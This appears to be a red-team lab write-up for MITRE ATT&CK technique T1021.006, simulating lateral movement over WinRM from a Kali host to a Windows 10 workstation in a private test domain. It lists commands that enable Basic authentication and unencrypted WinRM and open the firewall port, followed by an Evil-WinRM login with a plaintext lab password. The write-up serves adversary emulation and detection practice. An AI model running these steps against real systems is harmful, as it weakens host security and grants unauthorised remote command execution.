# T1021.006 - Remote Services: Windows Remote Management (WinRM)

## Description
This technique involves using Windows Remote Management (WinRM) to interact with a remote system. WinRM is a legitimate Windows service that allows remote PowerShell execution and management.
It is commonly abused for lateral movement and remote command execution.

**MITRE ATT&CK Technique:** [T1021.006 - Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/)

---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Access Method:** Valid local account (`RedTeam`)
- **Tool:** Evil-WinRM

---

## Execution Steps

### 1. Enable WinRM on Target

cmd
winrm quickconfig -force
winrm set winrm/config/service/auth @{Basic="true"}
winrm set winrm/config/service @{AllowUnencrypted="true"}
netsh advfirewall firewall add rule name="WinRM HTTP" dir=in action=allow protocol=TCP localport=5985

2. Connect from Kalibash

evil-winrm -i 192.168.10.9 -u RedTeam -p "P@ssw0rd123"

ResultsStatus: Successful
Successfully enabled and configured WinRM on the target.
Established a remote PowerShell session using a valid local account (RedTeam).
Gained interactive command execution on the target machine.




